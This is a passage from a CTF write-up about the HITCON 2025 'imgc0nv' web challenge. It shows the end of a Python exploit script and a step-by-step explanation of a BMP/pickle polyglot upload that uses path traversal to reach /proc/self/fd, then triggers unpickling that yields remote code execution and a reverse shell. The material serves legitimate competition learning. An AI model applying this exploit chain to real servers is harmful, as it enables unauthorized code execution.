</span></span><span style=display:flex><span>remote_filename <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;/usr/share/doc/li</span><span style=color:#e6db74>{</span>repl<span style=color:#e6db74>}</span><span style=color:#e6db74>c3/../../../../..</span><span style=color:#e6db74>{</span>repl<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>fmt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;bmp&#34;</span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> [(<span style=color:#e6db74>&#34;files&#34;</span>, (remote_filename, payload)) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>6</span>)]
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#34;format&#34;</span>: fmt}, files<span style=color:#f92672>=</span>files)
</span></span></code></pre></div><p>Here&rsquo;s what happens when the exploit runs:</p><ol><li><p><strong>Polyglot Construction</strong>: We create a 20000x3450 RGB image, specifically sized so the BMP file size lands us with byte 5 = 0x56 (the <code>V</code> pickle opcode). This black image starts as a ~207MB BMP.</p></li><li><p><strong>Pickle Injection</strong>: The RCE payload gets injected 100 bytes into the BMP data, right after a newline character and a <code>0</code> pop opcode. The <code>V</code> opcode tells pickle to read until the next newline, effectively skipping the rest of the BMP header. We use pickle protocol 1 to avoid the overhead of modern framing.</p></li><li><p><strong>PNG Compression</strong>: The polyglot BMP is converted to PNG, shrinking from 207MB to ~201KB through lossless compression. This allows us to stay under the 5MB request limit while still producing huge BMPs server-side.</p></li><li><p><strong>Path Manipulation</strong>: The filename <code>/usr/share/doc/lib/proc/self/fd/13c3/../../../../../proc/self/fd/13</code> exploits the extension replacement bug. When the server replaces the first <code>/proc/self/fd/13</code> with <code>bmp</code>, it creates <code>/usr/share/doc/libbmpc3/...</code> which traverses back to the actual target <code>/proc/self/fd/13</code>.</p></li><li><p><strong>Multiple Uploads</strong>: We send 6 copies of the same file in one request. Each gets decoded from PNG and re-encoded as a 207MB BMP by Pillow, then written sequentially to FD 11 (the multiprocessing outqueue pipe in the challenge setup).</p></li><li><p><strong>Size Overflow</strong>: The first 4 bytes <code>BM??</code> tell the pickle receiver to expect ~1GB of data. Six 207MB files = 1.2GB total, which finally satisfies <code>_recv_bytes</code> and triggers unpickling.</p></li><li><p><strong>RCE Execution</strong>: The pickle machinery in the parent process deserializes our <code>PickleRCE</code> object, which calls <code>os.system()</code> with our command, giving us a reverse shell as the <code>nobody</code> user.</p></li></ol><p>Flag: <code>hitcon{i hope both sides of your Pillow are cold :)}</code></p><h2 class="relative group">Final Remarks<div id=final-remarks class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#final-remarks aria-label=Anchor>#</a></span></h2><p>The beauty of this challenge is how it chains together multiple subtle bugs - a trivial path traversal, a logic error in extension handling, and the cursed knowledge about the absurd design choice of using pickles for IPC - into a complex but satisfying exploit. The polyglot construction requiring both valid image headers and pickle opcodes while juggling size constraints makes this one of the more creative web challenges we&rsquo;ve seen.</p></div><div class="flex author"><img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width=96 height=96 alt="Emanuel Mairoll" src=/img/author_hu_17fff41dbcaade56.jpg><div class=place-self-center><div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">Author</div><div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">Emanuel Mairoll</div><div class="text-sm text-neutral-700 dark:text-neutral-400">Forward & Reverse Engineer</div><div class="text-2xl sm:text-lg"><div class="flex flex-wrap text-neutral-400 dark:text-neutral-500"><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://github.com/EmanuelMairoll target=_blank aria-label=Github rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://stackoverflow.com/users/18277713/emanuelm target=_blank aria-label=Stack-Overflow rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 384 512"><path fill="currentColor" d="M290.7 311 95 269.7 86.8 309l195.7 41zm51-87L188.2 95.7l-25.5 30.8 153.5 128.3zm-31.2 39.7L129.2 179l-16.7 36.5L293.7 3e2zM262 32l-32 24 119.3 160.3 32-24zm20.5 328h-2e2v39.7h2e2zm39.7 80H42.7V320h-40v160h359.5V320h-40z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=https://www.linkedin.com/in/emanuel-mairoll-512458164/ target=_blank aria-label=Linkedin rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></span></a><a class="px-1 hover:text-primary-700 dark:hover:text-primary-400" href=mailto:sigmoid_flavors_0u@icloud.com target=_blank aria-label=Envelope rel="me noopener noreferrer"><span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M48 64C21.5 64 0 85.5.0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4.0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4.0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3.0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8.0L0 176z"/></svg></span></span></a></div></div></div></div><div class=mb-10></div></div><script type=text/javascript src=/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_posts/hitcon2025-imgc0nv/index.md data-oid-likes=likes_posts/hitcon2025-imgc0nv/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span><a class="flex group mr-3" href=/posts/412ctf-heap-meanu/><span class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400">&larr;</span>
<span class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400">&rarr;</span>
<span class="flex flex-col"><span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500">EPFL CS412 CTF – HEAP-MEANU</span>
<span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2025-04-02T00:00:00+00:00>2 April 2025</time>
</span></span></a></span><span></span></div></div></footer></article></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/acknowledgements/ title=Acknowledgements>Acknowledgements</a></li><li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/privacy/ title="Privacy Statement">Privacy</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
Emanuel Mairoll</p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>